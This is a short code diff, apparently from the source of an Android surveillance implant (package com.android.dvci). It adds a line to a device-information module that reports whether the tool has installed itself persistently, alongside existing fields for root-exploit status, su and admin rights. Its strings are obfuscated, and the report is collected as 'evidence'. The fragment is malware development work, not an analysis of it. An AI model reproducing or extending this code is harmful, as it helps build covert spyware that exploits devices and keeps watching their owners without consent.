@@ -21,7 +21,6 @@ import com.android.dvci.Device;
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
@@ -140,6 +139,7 @@ public class ModuleDevice extends BaseInstantModule {
 			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") + ", status=" + Status.getExploitStatusString() + ", result=" + Status.getExploitResultString()
 					+ M.e(", Su: ") + (su ? "yes" : "no") + " "
 					+ M.e(", Admin: ") + (admin ? "yes" : "no") + "\n");
+			sb.insert(0, M.e("Installation: ") + (Cfg.PERSISTENCE ? (M.e("Persistence ["+ Status.getPersistencyStatusStr()) +M.e("]")):"Standard") + "\n");
 			sb.insert(0, M.e("Free space: ") + freeSpace + " KB" + "\n");
 			sb.insert(0, M.e("Battery: ") + battery + "%" + "\n");
 
